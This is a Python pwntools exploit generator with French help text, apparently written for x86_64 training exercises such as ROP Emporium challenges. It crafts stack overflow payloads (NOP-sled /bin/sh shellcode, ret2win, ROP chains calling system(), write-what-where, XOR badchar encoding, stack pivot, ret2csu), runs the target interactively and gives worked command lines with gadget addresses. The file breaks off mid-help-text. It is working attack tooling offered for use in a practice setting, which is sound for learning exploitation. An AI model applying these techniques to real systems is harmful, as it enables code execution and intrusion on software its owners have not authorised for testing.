#!/usr/bin/env python3
from __future__ import annotations

import argparse
import re
import shutil
from pathlib import Path

try:
    from pwn import *
    PWNLIB_IMPORT_ERROR = None
except ModuleNotFoundError as exc:
    PWNLIB_IMPORT_ERROR = exc


DEFAULT_TARGET = "./binaries/bin/bof"
DEFAULT_CYCLIC_ALPHABET = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"


def parse_int(value: str) -> int:
    try:
        return int(value, 0)
    except ValueError as exc:
        raise argparse.ArgumentTypeError(f"invalid integer/address: {value}") from exc


def byte_from_int(value: int) -> bytes:
    if not 0 <= value <= 0xFF:
        raise argparse.ArgumentTypeError("byte values must be between 0x00 and 0xff")
    return bytes([value])


def parse_byte(value: str) -> bytes:
    return byte_from_int(parse_int(value))


def decode_hex_shellcode(data: bytes) -> bytes:
    text = data.decode("utf-8", errors="strict")
    text = re.sub(r"(\\x|0x|[,;])", "", text)
    text = re.sub(r"\s+", "", text)
    if len(text) % 2:
        raise SystemExit("hex shellcode has an odd number of hex digits")
    try:
        return bytes.fromhex(text)
    except ValueError as exc:
        raise SystemExit(f"invalid hex shellcode: {exc}") from exc


def is_probably_text(data: bytes) -> bool:
    if not data:
        return False

    try:
        text = data.decode("utf-8")
    except UnicodeDecodeError:
        return False

    return all(char.isprintable() or char in "\r\n\t" for char in text)


def first_meaningful_script_line(data: bytes) -> str | None:
    if not is_probably_text(data):
        return None

    text = data.decode("utf-8")
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        return line
    return None


def normalize_shell_command(command: str) -> str | None:
    parts = command.split()
    if not parts:
        return None

    if parts[0] == "exec" and len(parts) >= 2:
        parts = parts[1:]

    executable = parts[0]
    if executable in {"sh", "/bin/sh", "/usr/bin/sh"}:
        return "/bin/sh"
    if executable in {"bash", "/bin/bash", "/usr/bin/bash"}:
        return "/bin/bash"
    return None


def shellcode_from_shell_path(path: str) -> bytes:
    if path == "/bin/sh":
        return asm(shellcraft.sh())
    return asm(shellcraft.execve(path, 0, 0))


def detect_shellcode_format(path: Path, selected: str) -> str:
    if selected != "auto":
        return selected

    suffix = path.suffix.lower()
    if suffix in {".asm", ".s"}:
        return "asm"
    if suffix in {".hex", ".txt"}:
        return "hex"
    if suffix in {".sh"}:
        return "text"
    return "raw"


def load_shellcode(path: Path, selected_format: str) -> bytes:
    if not path.is_file():
        raise SystemExit(f"shellcode file not found: {path}")

    data = path.read_bytes()
    shellcode_format = detect_shellcode_format(path, selected_format)

    if shellcode_format == "raw":
        shellcode = data
    elif shellcode_format == "hex":
        shellcode = decode_hex_shellcode(data)
    elif shellcode_format == "asm":
        source = data.decode("utf-8", errors="strict")
        shellcode = asm(source)
    elif shellcode_format == "text":
        command = first_meaningful_script_line(data)
        shell_path = normalize_shell_command(command or "")
        if shell_path is None:
            raise SystemExit(
                f"{path} looks like text, not shellcode. Put raw shellcode bytes, "
                "hex bytes, assembly, or a simple shell path like /bin/sh."
            )
        shellcode = shellcode_from_shell_path(shell_path)
        log.warning(
            "corrected text shell file %s into executable shellcode for %s",
            path,
            shell_path,
        )
    else:
        raise SystemExit(f"unsupported shellcode format: {shellcode_format}")

    if not shellcode:
        raise SystemExit("shellcode is empty")

    log.info("loaded %d bytes of %s shellcode from %s", len(shellcode), shellcode_format, path)
    return shellcode


def process_env(args):
    return {} if args.empty_env else None


def require_pwntools() -> None:
    if PWNLIB_IMPORT_ERROR is not None:
        raise SystemExit(
            "pwntools is required to generate payloads. Install it with: "
            "python3 -m pip install pwntools"
        ) from PWNLIB_IMPORT_ERROR


def core_dir(args) -> Path:
    path = Path(args.core_dir).expanduser()
    if not path.is_absolute():
        path = Path.cwd() / path
    return path.resolve()


def archived_core_path(destination_dir: Path, source: Path) -> Path:
    destination = destination_dir / source.name
    if not destination.exists():
        return destination

    index = 1
    while True:
        candidate = destination_dir / f"{source.name}.{index}"
        if not candidate.exists():
            return candidate
        index += 1


def move_corefile(args, core, label: str) -> None:
    source_value = getattr(core, "path", None)
    if not source_value:
        log.warning("could not find %s corefile path", label)
        return

    source = Path(source_value)
    if not source.exists():
        log.warning("%s corefile is not on disk anymore: %s", label, source)
        return

    destination_dir = core_dir(args)
    destination_dir.mkdir(parents=True, exist_ok=True)
    destination = archived_core_path(destination_dir, source)

    if source.resolve() == destination.resolve():
        log.info("%s corefile already in %s", label, destination_dir)
        return

    shutil.move(str(source), str(destination))
    log.success("moved %s corefile to %s", label, destination)


def target_path(args) -> Path:
    path = Path(args.target).expanduser()
    if not path.is_absolute():
        path = Path.cwd() / path
    return path.resolve()


def target_cwd(args) -> str | None:
    target = target_path(args)
    if args.cwd == "target-dir":
        return str(target.parent)
    if args.cwd == "current":
        return None

    path = Path(args.cwd).expanduser()
    if not path.is_absolute():
        path = Path.cwd() / path
    return str(path.resolve())


def start_target(args, payload: bytes):
    executable = str(target_path(args))
    cwd = target_cwd(args)

    if args.input == "stdin":
        p = process(executable, aslr=args.aslr, env=process_env(args), cwd=cwd)
        if args.stdin_newline:
            p.sendline(payload)
        else:
            p.send(payload)
        return p

    if b"\x00" in payload:
        raise SystemExit("payload contains NUL bytes and cannot be passed through argv")
    return process([executable, payload], aslr=args.aslr, env=process_env(args), cwd=cwd)


def wait_for_crash(args, p, label: str) -> None:
    p.wait_for_close(timeout=args.crash_timeout)
    if p.poll() is None:
        p.close()
        raise SystemExit(
            f"{label} did not crash/exit within {args.crash_timeout} seconds. "
            "If the target reads from stdin, use --input stdin. "
            "Otherwise check --pattern-len or provide --offset manually."
        )


def cyclic_alphabet(args) -> bytes:
    if args.cyclic_alphabet is None:
        alphabet = DEFAULT_CYCLIC_ALPHABET
    else:
        alphabet = args.cyclic_alphabet.encode()

    badchars = parse_badchars(getattr(args, "badchars", None))
    if badchars:
        alphabet = bytes(byte for byte in alphabet if byte not in badchars)

    if len(alphabet) < 2:
        raise SystemExit("--cyclic-alphabet is too small after badchar filtering")
    return alphabet


def find_offset(args) -> int:
    alphabet = cyclic_alphabet(args)
    pattern = cyclic(args.pattern_len, alphabet=alphabet, n=args.cyclic_n)
    if args.cyclic_n > context.bytes:
        raise SystemExit(f"--cyclic-n must be <= pointer size ({context.bytes}) for auto offset")

    log.info(
        "crashing target with cyclic pattern (%d bytes, n=%d, alphabet=%d bytes)",
        len(pattern),
        args.cyclic_n,
        len(alphabet),
    )
    p = start_target(args, pattern)
    wait_for_crash(args, p, "cyclic probe")

    core = p.corefile
    try:
        candidates = [("fault_addr", core.fault_addr), ("pc", core.pc)]

        try:
            candidates.append(("sp_deref", core.unpack(core.sp)))
        except Exception:
            pass

        for name, value in candidates:
            try:
                needle = int(value).to_bytes(context.bytes, context.endian, signed=False)[: args.cyclic_n]
            except (OverflowError, TypeError, ValueError):
                continue

            offset = pattern.find(needle)
            if 0 <= offset < args.pattern_len:
                log.success("offset = %d (%s = %#x)", offset, name, value)
                return offset

        raise SystemExit(
            "could not find a valid offset. Check that the crash overwrites RIP "
            "and increase --pattern-len if needed."
        )
    finally:
        move_corefile(args, core, "cyclic probe")


def get_offset(args) -> int:
    if args.offset is not None:
        log.success("offset = %d (manual)", args.offset)
        return args.offset
    return find_offset(args)


def pack_return_address(address: int, ret_size: int) -> bytes:
    if not 1 <= ret_size <= context.bytes:
        raise SystemExit(f"--ret-size must be between 1 and {context.bytes}")
    return p64(address)[:ret_size]


def get_ret_size(args) -> int:
    if args.ret_size is not None:
        return args.ret_size
    if args.input == "stdin":
        return context.bytes
    return 6


def validate_no_nul_for_argv(payload: bytes, label: str) -> None:
    if b"\x00" in payload:
        raise SystemExit(f"{label} contains NUL bytes and cannot be passed through argv")


def parse_badchars(value: str | None) -> bytes:
    if not value:
        return b""

    cleaned = value.replace(",", " ").replace(";", " ")
    result = bytearray()
    for part in cleaned.split():
        result.append(parse_int(part))
    return bytes(result)


def data_from_args(args) -> bytes:
    sources = [
        args.data is not None,
        args.data_hex is not None,
        args.data_file is not None,
    ]
    if sum(sources) != 1:
        raise SystemExit("provide exactly one of --data, --data-hex, or --data-file")

    if args.data is not None:
        data = args.data.encode()
    elif args.data_hex is not None:
        data = decode_hex_shellcode(args.data_hex.encode())
    else:
        data = Path(args.data_file).read_bytes()

    if args.nul_terminate and not data.endswith(b"\x00"):
        data += b"\x00"

    if not data:
        raise SystemExit("data is empty")

    return data


def check_badchars(data: bytes, badchars: bytes, label: str) -> None:
    if not badchars:
        return

    found = sorted(set(data) & set(badchars))
    if found:
        rendered = ", ".join(f"0x{byte:02x}" for byte in found)
        raise SystemExit(f"{label} contains badchars: {rendered}")


def chunk_data(data: bytes, word_size: int, pad_byte: bytes) -> list[bytes]:
    if word_size <= 0:
        raise SystemExit("--word-size must be positive")
    if word_size > context.bytes:
        raise SystemExit(f"--word-size must be <= pointer size ({context.bytes})")

    chunks = []
    for index in range(0, len(data), word_size):
        chunk = data[index : index + word_size]
        if len(chunk) < word_size:
            chunk = chunk.ljust(word_size, pad_byte)
        chunks.append(chunk)
    return chunks


def pack_chain(addresses: list[int]) -> bytes:
    return b"".join(p64(address) for address in addresses)


def payload_from_chain(args, chain: list[int]) -> bytes:
    offset = get_offset(args)
    payload = (args.padding_byte * offset) + pack_chain(chain)
    for index, address in enumerate(chain):
        log.success("chain[%d] = %#x", index, address)
    return payload


def build_shellcode_body(args, offset: int, shellcode: bytes) -> bytes:
    nop_len = offset - len(shellcode) - args.post_shell_padding
    if nop_len < 0:
        raise SystemExit(
            "shellcode + post padding is larger than the offset "
            f"({len(shellcode)} + {args.post_shell_padding} > {offset})"
        )

    body = (args.nop_byte * nop_len) + shellcode + (args.padding_byte * args.post_shell_padding)
    if len(body) != offset:
        raise SystemExit(f"internal error: body length is {len(body)}, expected {offset}")
    return body


def find_shellcode_address(args, body: bytes, shellcode: bytes) -> int:
    probe_payload = body + (args.crash_byte * get_ret_size(args))
    if args.input == "argv":
        validate_no_nul_for_argv(probe_payload, "probe payload")

    log.info("crashing target with probe payload to locate shellcode on the stack")
    p = start_target(args, probe_payload)
    wait_for_crash(args, p, "shellcode probe")
    core = p.corefile

    try:
        matches = [
            address
            for address in core.search(shellcode)
            if core.stack.start <= address < core.stack.stop
        ]

        if not matches:
            raise SystemExit("shellcode was not found on the stack in the corefile")

        address = matches[0]
        log.success("shellcode @ %#x", address)
        return address
    finally:
        move_corefile(args, core, "shellcode probe")


def build_shellcode_payload(args) -> bytes:
    offset = get_offset(args)

    if args.builtin_sh:
        shellcode = asm(shellcraft.sh())
        log.info("using built-in local /bin/sh shellcode (%d bytes)", len(shellcode))
    else:
        shellcode = load_shellcode(Path(args.shellcode_file), args.shellcode_format)

    body = build_shellcode_body(args, offset, shellcode)

    if args.ret_addr is None:
        ret_addr = find_shellcode_address(args, body, shellcode)
    else:
        ret_addr = args.ret_addr
        log.success("return address = %#x (manual)", ret_addr)

    ret = pack_return_address(ret_addr, get_ret_size(args))
    payload = body + ret
    return payload


def build_jump_payload(args) -> bytes:
    offset = get_offset(args)
    ret = pack_return_address(args.addr, get_ret_size(args))
    payload = (args.padding_byte * offset) + ret
    log.success("jump address = %#x", args.addr)
    return payload


def build_chain_payload(args) -> bytes:
    return payload_from_chain(args, args.chain_addrs)


def build_system_payload(args) -> bytes:
    addresses = []
    if args.ret is not None:
        addresses.append(args.ret)
    addresses.extend([args.pop_rdi, args.cmd_addr, args.system_addr])

    args.chain_addrs = addresses
    log.success("system argument string @ %#x", args.cmd_addr)
    log.success("system() @ %#x", args.system_addr)
    return build_chain_payload(args)


def append_individual_register_args(args, chain: list[int]) -> None:
    registers = [
        ("rdi", args.pop_rdi, args.arg_rdi),
        ("rsi", args.pop_rsi, args.arg_rsi),
        ("rdx", args.pop_rdx, args.arg_rdx),
        ("rcx", args.pop_rcx, args.arg_rcx),
        ("r8", args.pop_r8, args.arg_r8),
        ("r9", args.pop_r9, args.arg_r9),
    ]

    for register, gadget, value in registers:
        if value is None:
            continue
        if gadget is None:
            raise SystemExit(f"--arg-{register} requires --pop-{register}")
        chain.extend([gadget, value])


def append_function_call(args, chain: list[int], function_address: int) -> None:
    if args.pop_rdi_rsi_rdx is not None:
        missing = [
            name
            for name, value in (
                ("--arg-rdi", args.arg_rdi),
                ("--arg-rsi", args.arg_rsi),
                ("--arg-rdx", args.arg_rdx),
            )
            if value is None
        ]
        if missing:
            raise SystemExit(f"--pop-rdi-rsi-rdx requires {', '.join(missing)}")
        chain.extend([args.pop_rdi_rsi_rdx, args.arg_rdi, args.arg_rsi, args.arg_rdx])
    else:
        append_individual_register_args(args, chain)

    chain.append(function_address)


def build_call_payload(args) -> bytes:
    chain = []
    if args.ret is not None:
        chain.append(args.ret)

    for function_address in args.funcs:
        append_function_call(args, chain, function_address)

    return payload_from_chain(args, chain)


def add_write_chunks(args, chain: list[int], data: bytes) -> None:
    if args.write_extra_pops < 0:
        raise SystemExit("--write-extra-pops must be >= 0")

    chunks = chunk_data(data, args.word_size, args.pad_byte)
    for index, chunk in enumerate(chunks):
        destination = args.where + (index * args.word_size)
        value = int.from_bytes(chunk, "little")

        chain.append(args.pop_write)
        if args.write_order == "dst-value":
            chain.extend([destination, value])
        else:
            chain.extend([value, destination])
        chain.extend([args.write_junk] * args.write_extra_pops)
        chain.append(args.write_gadget)

        log.info("write[%d] %#x <- %r", index, destination, chunk)


def add_optional_call_after_write(args, chain: list[int]) -> None:
    if args.call_addr is None:
        return
    if args.pop_rdi is None:
        raise SystemExit("--call-addr requires --pop-rdi")

    call_arg = args.call_arg if args.call_arg is not None else args.where
    if args.call_ret is not None:
        chain.append(args.call_ret)
    chain.extend([args.pop_rdi, call_arg, args.call_addr])
    log.success("call target @ %#x with rdi=%#x", args.call_addr, call_arg)


def build_write_payload(args) -> bytes:
    data = data_from_args(args)
    check_badchars(data, parse_badchars(args.badchars), "plain data")

    chain = []
    if args.ret is not None:
        chain.append(args.ret)
    add_write_chunks(args, chain, data)
    add_optional_call_after_write(args, chain)
    return payload_from_chain(args, chain)


def encode_badchars(data: bytes, badchars: bytes, xor_key: int) -> bytes:
    key = byte_from_int(xor_key)[0]
    encoded = bytes(byte ^ key for byte in data)
    check_badchars(encoded, badchars, "encoded data")
    return encoded


def add_xor_decoders(args, chain: list[int], length: int) -> None:
    for index in range(length):
        address = args.where + index
        chain.append(args.pop_xor)
        if args.xor_order == "key-addr":
            chain.extend([args.xor_key, address])
        else:
            chain.extend([address, args.xor_key])
        chain.append(args.xor_gadget)
        log.info("decode byte[%d] @ %#x with xor %#x", index, address, args.xor_key)


def build_badchars_payload(args) -> bytes:
    plain = data_from_args(args)
    badchars = parse_badchars(args.badchars)
    encoded = encode_badchars(plain, badchars, args.xor_key)

    chain = []
    if args.ret is not None:
        chain.append(args.ret)
    add_write_chunks(args, chain, encoded)
    add_xor_decoders(args, chain, len(plain))
    add_optional_call_after_write(args, chain)
    return payload_from_chain(args, chain)


def build_pivot_payload(args) -> bytes:
    chain = []
    if args.pop_rsp is not None:
        chain.extend([args.pop_rsp, args.pivot_addr])
    else:
        if args.pop_rax is None or args.xchg_rax_rsp is None:
            raise SystemExit("pivot requires either --pop-rsp, or both --pop-rax and --xchg-rax-rsp")
        chain.extend([args.pop_rax, args.pivot_addr, args.xchg_rax_rsp])
    return payload_from_chain(args, chain)


def build_ret2csu_payload(args) -> bytes:
    chain = []
    if args.ret is not None:
        chain.append(args.ret)

    chain.extend(
        [
            args.csu_pop,
            0,
            1,
            args.call_ptr,
            args.arg_rdi,
            args.arg_rsi,
            args.arg_rdx,
            args.csu_call,
            args.stack_pad,
            args.junk,
            args.junk,
            args.junk,
            args.junk,
            args.junk,
            args.junk,
        ]
    )

    if args.next_addr is not None:
        chain.append(args.next_addr)

    return payload_from_chain(args, chain)


def find_byte_address_in_binary(byte: int) -> int:
    elf = context.binary
    for address in elf.search(bytes([byte])):
        return address
    raise SystemExit(f"could not find byte 0x{byte:02x} in target for fluff/xlatb")


def add_fluff_byte_writer(args, chain: list[int], data: bytes) -> None:
    current_al = args.initial_al & 0xFF
    for index, byte in enumerate(data):
        destination = args.where + index
        source = find_byte_address_in_binary(byte)
        wanted_rbx = source - current_al
        rcx_value = wanted_rbx - args.bextr_add

        chain.extend(
            [
                args.bextr,
                args.bextr_control,
                rcx_value,
                args.xlat,
                args.stosb,
            ]
        )
        log.info(
            "fluff[%d] %#x <- 0x%02x using source %#x, previous al=0x%02x",
            index,
            destination,
            byte,
            source,
            current_al,
        )
        current_al = byte


def build_fluff_payload(args) -> bytes:
    data = data_from_args(args)

    chain = []
    if args.ret is not None:
        chain.append(args.ret)

    chain.extend([args.pop_rdi, args.where])
    add_fluff_byte_writer(args, chain, data)

    if args.call_ret is not None:
        chain.append(args.call_ret)
    chain.extend([args.pop_rdi, args.where, args.print_file])
    log.success("print_file target @ %#x with rdi=%#x", args.print_file, args.where)
    return payload_from_chain(args, chain)


def parse_compose_part(part: str) -> bytes:
    kind, separator, value = part.partition(":")
    if not separator:
        raise argparse.ArgumentTypeError("parts must look like addr:0x401000, u64:1, hex:4141, or str:text")

    if kind == "addr" or kind == "u64":
        return p64(parse_int(value))
    if kind == "u32":
        return p32(parse_int(value))
    if kind == "byte":
        return parse_byte(value)
    if kind == "hex":
        return decode_hex_shellcode(value.encode())
    if kind == "str":
        return value.encode()
    if kind == "file":
        return Path(value).read_bytes()

    raise argparse.ArgumentTypeError(f"unsupported part kind: {kind}")


def build_compose_payload(args) -> bytes:
    offset = get_offset(args)
    body = b"".join(parse_compose_part(part) for part in args.parts)
    return (args.padding_byte * offset) + body


def write_payload(path: Path, payload: bytes) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(payload)
    log.success("wrote %d bytes to %s", len(payload), path)


def run_payload(args, payload: bytes) -> None:
    log.info("running final payload")
    p = start_target(args, payload)
    p.interactive()


def build_parser() -> argparse.ArgumentParser:
    common_epilog = """
Modes:
  shellcode  Place du shellcode dans le payload puis saute dessus.
  jump       Ecrase l'adresse de retour avec une seule adresse.
  chain      Construit une chaine ROP brute avec plusieurs adresses.
  system     Appelle system(cmd_addr) avec un gadget pop rdi ; ret.
  call       Appelle une ou plusieurs fonctions avec des arguments en registres.
  write      Ecrit une chaine en memoire avec des gadgets write-what-where.
  badchars   Ecrit une chaine encodee puis la decode en memoire.
  fluff      Ecrit une chaine avec bextr/xlatb/stosb puis appelle print_file.
  pivot      Construit une petite payload de pivot de stack.
  ret2csu    Utilise les gadgets __libc_csu_init pour rdi/rsi/rdx.
  compose    Assemble des morceaux bruts dans l'ordre exact donne.

Lecture rapide:
  Le script construit toujours:
    padding jusqu'au saved RIP
    puis la chaine demandee par le mode

  Une option --pop-xxx est l'adresse d'un gadget qui consomme la ou les valeurs
  suivantes sur la pile. Exemple:
    --pop-rdi 0x4007c3 --cmd-addr 0x601060 --system-addr 0x400560

  devient:
    0x4007c3      # pop rdi ; ret
    0x601060      # valeur poppee dans rdi
    0x400560      # prochaine adresse chargee dans RIP

  Une option --ret ajoute un gadget ret avant la chaine pour l'alignement de
  stack x86_64. C'est utile quand un appel system()/libc plante sans raison
  apparente alors que les adresses sont bonnes.

Options de creation courantes:
  --pop-rdi, --pop-rsi, --pop-rdx:
      gadgets qui mettent les arguments dans les registres d'appel Linux x86_64.
  --arg-rdi, --arg-rsi, --arg-rdx:
      valeurs qui seront consommees par les gadgets pop correspondants.
  --write-order dst-value:
      le gadget pop consomme d'abord l'adresse destination, puis la valeur.
  --write-order value-dst:
      le gadget pop consomme d'abord la valeur, puis l'adresse destination.
  --xor-order key-addr / addr-key:
      meme idee pour le gadget qui prepare le XOR de badchars.
  --write-extra-pops N:
      ajoute N valeurs junk apres destination/valeur si ton gadget pop contient
      plus de registres que ceux utilises par le gadget d'ecriture.

Aide detaillee par mode:
  python3 payload2.py shellcode -h
  python3 payload2.py jump -h
  python3 payload2.py chain -h
  python3 payload2.py system -h
  python3 payload2.py call -h
  python3 payload2.py write -h
  python3 payload2.py badchars -h
  python3 payload2.py fluff -h
  python3 payload2.py pivot -h
  python3 payload2.py ret2csu -h
  python3 payload2.py compose -h

Exemples:
  # ret2win, entree stdin, offset automatique
  python3 payload2.py --run --input stdin --target ./binaries/rop_emporium/ret2win jump --addr 0x400757

  # split: system("/bin/cat flag.txt")
  python3 payload2.py --run --input stdin --target ./binaries/rop_emporium/split system \\
    --ret 0x400741 \\
    --pop-rdi 0x4007c3 \\
    --cmd-addr 0x601060 \\
    --system-addr 0x400560

  # shellcode local /bin/sh passe en argv
  python3 payload2.py --run --argv-safe --target ./binaries/bin/bof shellcode --builtin-sh

  # callme: trois appels avec les constantes attendues par le challenge
  python3 payload2.py --run --input stdin --target ./binaries/rop_emporium/callme call \\
    --pop-rdi-rsi-rdx 0x40093c \\
    --arg-rdi 0xdeadbeefdeadbeef \\
    --arg-rsi 0xcafebabecafebabe \\
    --arg-rdx 0xd00df00dd00df00d \\
    --func 0x400720 --func 0x400740 --func 0x4006f0

  # write4: ecrire "flag.txt" en .data puis appeler print_file
  python3 payload2.py --run --input stdin --target ./binaries/rop_emporium/write4 write \\
    --where 0x601028 \\
    --data "flag.txt" --nul-terminate \\
    --pop-write 0x400690 \\
    --write-gadget 0x400628 \\
    --write-order dst-value \\
    --pop-rdi 0x400693 \\
    --call-addr 0x400510

  # badchars: ecrire une chaine XOR-ee, la decoder octet par octet, puis appeler print_file
  python3 payload2.py --run --input stdin --target ./binaries/rop_emporium/badchars badchars \\
    --where 0x601038 \\
    --data "flag.txt" --nul-terminate \\
    --badchars "0x78 0x67 0x61 0x2e" \\
    --xor-key 2 \\
    --pop-write 0x40069c --write-gadget 0x400634 --write-order value-dst --write-extra-pops 2 \\
    --pop-xor 0x4006a0 --xor-gadget 0x400628 --xor-order key-addr \\
    --pop-rdi 0x4006a3 --call-addr 0x400510

  # fluff: ecrire flag.txt avec xlatb/stosb puis print_file("flag.txt")
  python3 payload2.py --run --input stdin --target ./binaries/rop_emporium/fluff fluff \\
    --where 0x601028 \\
    --data "flag.txt" --nul-terminate \\
    --pop-rdi 0x4006a3 \\
    --bextr 0x40062a \\
    --xlat 0x400628 \\
    --stosb 0x400639 \\
    --print-file 0x400510

  # ret2csu: controler rdi/rsi/rdx avec les gadgets __libc_csu_init
  python3 payload2.py --run --input stdin --target ./binaries/rop_emporium/ret2csu ret2csu \\
    --csu-pop 0x40089a \\
    --csu-call 0x400880 \\
    --call-ptr 0x600e48 \\
    --arg-rdi 0xdeadbeefdeadbeef \\
    --arg-rsi 0xcafebabecafebabe \\
    --arg-rdx 0xd00df00dd00df00d \\
    --next-addr 0x4007b1

  # compose: payload ultra precis, ici equivalent manuel de split/system
  python3 payload2.py --run --input stdin --target ./binaries/rop_emporium/split compose \\
    --part addr:0x400741 \\
    --part addr:0x4007c3 \\
    --part addr:0x601060 \\
    --part addr:0x400560
"""

    parser = argparse.ArgumentParser(
        description=(
            "Generateur de payload pour TP x86_64 Linux. "
            "Par defaut, l'offset est trouve avec cyclic() si --offset n'est pas fourni."
        ),
        epilog=common_epilog,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--target", default=DEFAULT_TARGET, help=f"binaire cible a analyser/executer (defaut: {DEFAULT_TARGET})")
    parser.add_argument(
        "--offset",
        type=parse_int,
        help="nombre d'octets entre le debut de l'input controlee et le saved RIP; si absent, recherche avec cyclic()",
    )
    parser.add_argument(
        "--pattern-len",
        type=parse_int,
        default=200,
        help="taille du motif cyclic envoye pour provoquer le crash et retrouver l'offset (defaut: 200)",
    )
    parser.add_argument(
        "--cyclic-n",
        type=parse_int,
        default=8,
        help="taille des sous-sequences uniques du cyclic; garder 8 en amd64 pour retrouver un RIP 64 bits",
    )
    parser.add_argument(
        "--cyclic-alphabet",
        help=(
            "alphabet utilise pour le motif cyclic. Utile si la cible filtre des octets. "
            "Dans le mode badchars, les octets de --badchars sont aussi retires automatiquement."
        ),
    )
    parser.add_argument(
        "--ret-size",
        type=parse_int,
        help="taille de l'adresse de retour pour jump/shellcode: 8 en stdin, souvent 6 en argv pour eviter les NUL",
    )
    parser.add_argument("--padding-byte", type=parse_byte, default=b"A", help="octet utilise pour remplir jusqu'au saved RIP, ex: 0x41 pour 'A'")
    parser.add_argument("--nop-byte", type=parse_byte, default=b"\x90", help="octet NOP pour le sled du mode shellcode (defaut: 0x90)")
    parser.add_argument("--crash-byte", type=parse_byte, default=b"A", help="octet utilise pour ecraser temporairement RIP pendant les probes")
    parser.add_argument("--output", "-o", default="payload.bin", help="fichier ou ecrire le payload final genere")
    parser.add_argument("--core-dir", default="core", help="dossier cree si besoin ou les corefiles sont deplaces apres lecture")
    parser.add_argument(
        "--cwd",
        default="target-dir",
        help="'target-dir' lance depuis le dossier du binaire, 'current' depuis le dossier courant, ou un chemin custom",
    )
    parser.add_argument("--input", choices=("argv", "stdin"), default="argv", help="canal d'envoi: argv pour argument de programme, stdin pour read()/gets()/fgets()")
    parser.add_argument("--stdin-newline", action="store_true", help="ajoute un '\\n' apres le payload envoye sur stdin, utile si la cible attend une ligne")
    parser.add_argument("--crash-timeout", type=float, default=5.0, help="secondes max d'attente pendant les probes cyclic/shellcode avant d'abandonner")
    parser.add_argument("--aslr", action="store_true", help="laisse l'ASLR activee; par defaut pwntools lance la cible avec ASLR desactivee")
    parser.add_argument("--empty-env", action="store_true", help="lance la cible avec un environnement vide pour stabiliser la pile")
    parser.add_argument("--argv-safe", action="store_true", help="verifie que le payload final ne contient aucun octet NUL, obligatoire pour argv")
    parser.add_argument("--run", action="store_true", help="execute la cible avec le payload final apres l'avoir ecrit dans --output")
    parser.add_argument("--no-hexdump", action="store_true", help="n'affiche pas l'hexdump du payload final")
    parser.add_argument("--checksec", action="store_true", help="affiche les protections du binaire via pwntools; peut etre utilise seul")

    subparsers = parser.add_subparsers(
        dest="mode",
        required=False,
        metavar="{shellcode,jump,chain,system,call,write,badchars,fluff,pivot,ret2csu,compose}",
    )

    shellcode_parser = subparsers.add_parser(
        "shellcode",
        help="embarque du shellcode dans le payload",
        description="Construit un payload qui place du shellcode avant l'adresse de retour puis saute dessus.",
        epilog="""
Exemples:
  python3 payload2.py --run --argv-safe shellcode --builtin-sh
  python3 payload2.py --run --argv-safe shellcode --shellcode-file shell.asm --shellcode-format asm
  python3 payload2.py shellcode --shellcode-file sc.bin --shellcode-format raw

Payload genere:
  NOP sled
  shellcode
  padding apres shellcode
  adresse de retour vers le shellcode

Formats:
  raw   octets bruts deja executables.
  hex   texte hexadecimal, avec ou sans \\x.
  asm   assembleur transforme en shellcode par pwntools.
  text  ligne simple comme /bin/sh, convertie en vrai shellcode.

Si --ret-addr est absent, le script fait une probe, lit le corefile, cherche le
shellcode sur la stack, puis utilise cette adresse comme retour.
""",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    shellcode_source = shellcode_parser.add_mutually_exclusive_group(required=True)
    shellcode_source.add_argument("--shellcode-file", help="fichier contenant du shellcode raw, hex, asm, ou une ligne texte simple comme /bin/sh")
    shellcode_source.add_argument("--builtin-sh", action="store_true", help="genere avec pwntools un shellcode local execve('/bin/sh')")
    shellcode_parser.add_argument(
        "--shellcode-format",
        choices=("auto", "raw", "hex", "asm", "text"),
        default="auto",
        help="format du fichier shellcode; auto choisit selon l'extension",
    )
    shellcode_parser.add_argument(
        "--post-shell-padding",
        type=parse_int,
        default=56,
        help="nombre d'octets de padding places apres le shellcode avant le saved RIP",
    )
    shellcode_parser.add_argument("--ret-addr", type=parse_int, help="adresse de retour manuelle vers le shellcode; sinon le script tente de la retrouver dans le corefile")
    shellcode_parser.set_defaults(builder=build_shellcode_payload)

    jump_parser = subparsers.add_parser(
        "jump",
        help="saute directement vers une adresse",
        description="Construit padding + adresse. Utile pour ret2win ou une fonction simple.",
        epilog="""
Exemples:
  python3 payload2.py --run --input stdin --target ./ret2win jump --addr 0x400757
  python3 payload2.py --offset 40 jump --addr 0x400757

Payload genere:
  padding
  addr

Utilisation:
  Sert quand l'adresse cible est directement du code executable: fonction win,
  ret2win+1, gadget, ou debut d'une autre chaine. Ne pas l'utiliser pour une
  adresse de string comme "/bin/cat flag.txt": dans ce cas il faut system/call.
""",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    jump_parser.add_argument("--addr", type=parse_int, required=True, help="adresse de code chargee dans RIP au retour de la fonction vulnerable")
    jump_parser.set_defaults(builder=build_jump_payload)

    chain_parser = subparsers.add_parser(
        "chain",
        help="construit une chaine ROP brute",
        description="Construit padding + adresses donnees dans l'ordre. Repeter --addr pour chaque element.",
        epilog="""
Exemple:
  python3 payload2.py --run --input stdin chain \\
    --addr 0x400741 \\
    --addr 0x4007c3 \\
    --addr 0x601060 \\
    --addr 0x400560

Payload genere:
  padding
  addr_1
  addr_2
  addr_3
  ...

Ici le script ne comprend pas la semantique des adresses. Il packe simplement
chaque --addr en 64 bits little-endian, dans l'ordre donne.
""",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    chain_parser.add_argument(
        "--addr",
        dest="chain_addrs",
        type=parse_int,
        action="append",
        required=True,
        help="adresse a ajouter a la chaine; repeter pour chaque gadget/fonction/valeur",
    )
    chain_parser.set_defaults(builder=build_chain_payload)

    system_parser = subparsers.add_parser(
        "system",
        help="appelle system(cmd_addr) via pop rdi ; ret",
        description="Construit une chaine ROP pour appeler system() avec une chaine deja presente en memoire.",
        epilog="""
Exemple split:
  python3 payload2.py --run --input stdin --target ./split system \\
    --ret 0x400741 \\
    --pop-rdi 0x4007c3 \\
    --cmd-addr 0x601060 \\
    --system-addr 0x400560

Trouver les adresses:
  ROPgadget --binary ./split | grep "pop rdi"
  rabin2 -z ./split | grep "cat flag"
  objdump -d ./split | grep system@plt

Pile generee apres le padding:
  ret optionnel
